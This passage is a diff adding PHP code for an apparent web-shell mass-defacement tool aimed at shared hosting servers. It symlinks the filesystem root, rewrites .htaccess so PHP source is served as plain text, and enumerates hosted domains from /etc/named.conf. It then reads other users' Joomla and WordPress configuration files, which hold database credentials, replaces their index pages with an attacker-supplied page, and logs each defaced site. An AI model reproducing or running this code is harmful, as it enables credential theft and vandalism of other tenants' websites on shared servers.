+    $wr  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
+    $fp = @fopen ('sym/.htaccess','w');
+    fwrite($fp, $wr);
+    @symlink('/','sym/root');
+    $dominios = @file_get_contents("/etc/named.conf");
+    @preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);
+    $out[1] = array_unique($out[1]);
+    $numero_dominios = count($out[1]);
+    echo "Total domains: $numero_dominios <br><br />";
+    $def = $_POST['tunisia'];
+    $base_url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/sym/root/home/';
+    $output = fopen('defaced.html', 'a+');
+	echo ("<center><table class='result' width='100%' border=1 cellspacing=1 cellpading=1>  
+	<tr><th width=50%>domain</td><th width=25%>Type</td><th width=25%>Status</td></tr>");   
+   $j = 1;
+    $st = (isset($_GET['st']) && $_GET['st']!='') ? $_GET['st'] : 0;
+    for($i = $st; $i <= $numero_dominios; $i++)
+    {
+        $domain = $out[1][$i];
+        $dono_arquivo = @fileowner("/etc/valiases/".$domain);
+        $infos = @posix_getpwuid($dono_arquivo);
+        
+        if($infos['name']!='root') {
+$config01 = @file_get_contents($base_url.$infos['name']."/public_html/configuration.php");
+$config001 = @file_get_contents($base_url.$infos['name']."/public_html/joomla/configuration.php");
+$config02 = @file_get_contents($base_url.$infos['name']."/public_html/wp-config.php");
+$config03 = @file_get_contents($base_url.$infos['name']."/public_html/blog/wp-config.php");
+
+if($config001 && preg_match('/dbprefix/i',$config001)){
+echo '<tr><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';
+echo '<td align="center"><font color="pink">JOOMLA</font></td>';
+$res = index_changer_joomla($config001, $def, $domain);
+echo '<td>'.$res['output'].'</td>';
+if($res['cond']) {
+echo '<td align="center"><span class="green">DEFACED</span></td>';
+fwrite($output, 'http://'.$domain."<br>");
+$count1 = $count+1;
+} else {
+echo '<td align="center"><span class="red">FAILED</span></td>';
+}
+echo '</tr>';
+}
+        
+if($config01 && preg_match('/dbprefix/i',$config01)){
+echo '<tr><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';
+echo '<td align="center"><font color="pink">JOOMLA</font></td>';
+$res = index_changer_joomla($config01, $def, $domain);
+echo '<td>'.$res['output'].'</td>';
+if($res['cond']) {
+echo '<td align="center"><span class="green">DEFACED</span></td>';
+fwrite($output, 'http://'.$domain."<br>");
+$count1 = $count+1;
+} else {
+echo '<td align="center"><span class="red">FAILED</span></td>';
+}
+echo '</tr>';
+}
+
+if($config02 && preg_match('/DB_NAME/i',$config02)){
+echo '<tr><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';
+echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
+$res = index_changer_wp($config02, $def);
+echo '<td>'.$res['output'].'</td>';
+if($res['cond']) {
+echo '<td align="center"><span class="green">DEFACED</span></td>';
+fwrite($output, 'http://'.$domain."<br>");
+$count2 = $count2+1;
+} else {
+echo '<td align="center"><span class="red">FAILED</span></td>';
+}
+echo '</tr>';
+}
+if($config03 && preg_match('/DB_NAME/i',$config03)){
+echo '<tr><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';
+echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
+$res = index_changer_wp($config03, $def);
+echo '<td>'.$res['output'].'</td>';
+if($res['cond']) {
+echo '<td align="center"><span class="green">DEFACED</span></td>';
+fwrite($output, 'http://'.$domain."<br>");
+$count2 = $count2+1;
+} else {    
+echo '<td align="center"><span class="red">FAILED</span></td>';
+}
+echo '</tr>';
+}
+        }
+    }
+    echo '</table>';
+    echo '<hr/>';
+    echo 'Total Defaced = '.$count1 + $count2.' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';
+	echo '<a href="defaced.html" target="_blank">Show All</a><br />';
+}
+else {
+echo '
+<table>
+<form method="post">
+<tr>
+	<td>index url : </td>
+	<td><input type="text" size="60" name="tunisia" placeholder="put your index url here !"></td>
+</tr>
+<tr>
+	<td>use : </td>
+</tr>
+<tr>
+	<td><input type="radio" value="1" name="mode"></td><td>/etc/named.conf</td>
+</tr>
+<tr>
+	<td><input type="radio" checked="checked" value="2" name="mode"></td><td>/var/named</td>
+</tr>
+<tr>
+<td><br><input type="submit" name="tunisia_deface" value="Deface"></td>
+</tr>
+</form>
+</center>
+</body>
+</html>
+';
+}
+?>
